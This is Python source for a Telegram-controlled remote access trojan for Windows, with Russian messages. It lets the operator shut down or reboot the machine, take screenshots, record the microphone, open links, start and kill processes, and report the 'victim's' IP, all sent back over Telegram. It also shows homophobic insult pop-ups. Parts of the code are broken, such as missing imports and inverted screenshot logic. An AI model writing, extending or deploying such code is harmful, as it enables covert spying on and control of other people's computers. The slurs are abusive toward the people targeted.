import random,telebot,os,webbrowser,pyautogui,time,requests,re
from PIL import Image, ImageGrab
from bs4 import BeautifulSoup
from playsound import playsound



mytoken = 'telegram token'

bot = telebot.TeleBot(mytoken)

@bot.message_handler(content_types=['text'])
def commands(message):
        if message.text == '/off':
                bot.send_message(message.chat.id,'Компьютер будет выключен!')
                os.system('shutdown -s')


        elif message.text == '/open':
                bot.register_next_step_handler(message,get_url)
                bot.send_message(message.chat.id,'Отправьте ссылку!')
                

        elif message.text == '/screen':
                try:  
                        os.remove("screenshot.png")
                except:
                        bot.send_message(message.chat.id,'Делаю скриншот')
                        screen = pyautogui.screenshot('screenshot.png')
                        screen = open('screenshot.png', 'rb')
                        bot.send_photo(message.chat.id, screen)
                
        elif message.text == '/process':
                bot.send_message(message.chat.id,'Какой процесс хотите запустить(steam.exe)')
                bot.register_next_step_handler(message,get_process)
        
        
        elif message.text == '/ip':
                url = 'https://yandex.ru/internet/'
                page = requests.get(url)
                soup = BeautifulSoup(page.text, "html.parser")
                ip = soup.findAll('ul', class_='general-info layout__general-info')
                ip = str(ip)
                ip = re.sub('<[^>]*>', '\n', ip)
                bot.send_message(message.chat.id,'Айпи жертвы - ' + str(ip))
        
        
        
        elif message.text == '/window':
                pyautogui.alert("Ты пидор", "Тест", button="да")
                pyautogui.alert("Ты гей", "Тест", button="да")
                bot.send_message(message.chat.id,'Окна с тестом на гея созданы')
                
        elif message.text == '/kill':
                bot.send_message(message.chat.id,'Какой процесс хотите убить(steam.exe)')
                bot.register_next_step_handler(message,get_kill)                   
                
                
        elif message.text == '/reboot':
                os.system('shutdown -r -t 0')

        elif message.text == '/rep':
                bot.send_message(message.chat.id,'Какой файл вы хотите включить?')
                bot.register_next_step_handler(message,get_audio)    
  

        
        
        elif message.text == '/record':
                bot.send_message(message.chat.id,'Сколько секунд записать?(не больше 60):')
                bot.register_next_step_handler(message,get_record)

           


        
        
def get_record(message):
        global record
        record = message.text
        record = int(record)
        if record < 60:
                #запись с микрофона
                bot.send_message(message.chat.id,'Записываю,подожди')
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 44100
                RECORD_SECONDS = record
                WAVE_OUTPUT_FILENAME = "audio.wav"
                p = pyaudio.PyAudio()
                stream = p.open(format=FORMAT,
                                channels=CHANNELS,
                                rate=RATE,
                                input=True,
                                input_device_index=1, 
                                frames_per_buffer=CHUNK)
                frames = []
                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK)
                    frames.append(data)
                stream.stop_stream()
                
                stream.close()
                
                p.terminate()

                wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                
                wf.setnchannels(CHANNELS)
                
                wf.setsampwidth(p.get_sample_size(FORMAT))
                
                wf.setframerate(RATE)
                
                wf.writeframes(b''.join(frames))
                
                wf.close()
                #запись с микрофона

                audio = open('audio.wav', 'rb')
                
                bot.send_audio(message.chat.id, audio)


        else:
                bot.send_message(message.chat.id,'сказано не больше 60sec!')
                
        
        
        
def get_audio(message):
        global audio
        audio = message.text
        try:
                playsound(audio)
                bot.send_message(message.chat.id,'Включил данный файл\n ' + audio)
        except:
                bot.send_message(message.chat.id,'Не нашел данный файл\n ' + audio)
                
                




def get_url(message):
        global url
        url = message.text
        webbrowser.open_new(url)
        bot.send_message(message.chat.id,'Ссылка открыта!')


        
        
def get_process(message):
        global process
        process = message.text
        try:
                os.startfile(process)
                bot.send_message(message.chat.id,'Включил данный процесс\n' + process)
        except:
                 bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!')

                        
                        
                        
                        
def get_kill(message):
        global kill
        kill = message.text
        try:
                os.system("taskkill /im " + kill)
                bot.send_message(message.chat.id,'Данный процесс убит\n' + kill)
        except:
                bot.send_message(message.chat.id,'Вы ввели что-то неправильно,ошибка!')

                
                        
         
try:
        bot.polling(none_stop=True, interval=0)
except:
        pass
